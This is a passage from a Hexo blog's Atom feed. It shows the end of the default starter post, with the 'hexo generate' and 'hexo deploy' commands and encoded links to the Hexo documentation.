&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo generate&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3MvZ2VuZXJhdGluZy5odG1s&#34;&gt;Generating&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;deploy-to-remote-sites&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#deploy-to-remote-sites&#34;&gt;#&lt;/a&gt; Deploy to remote sites&lt;/h3&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ hexo deploy&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;More info: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvb25lLWNvbW1hbmQtZGVwbG95bWVudC5odG1s&#34;&gt;Deployment&lt;/span&gt;&lt;/p&gt;
</content>
        <updated>2023-04-23T15:55:29.640Z</updated>
    </entry>
</feed>
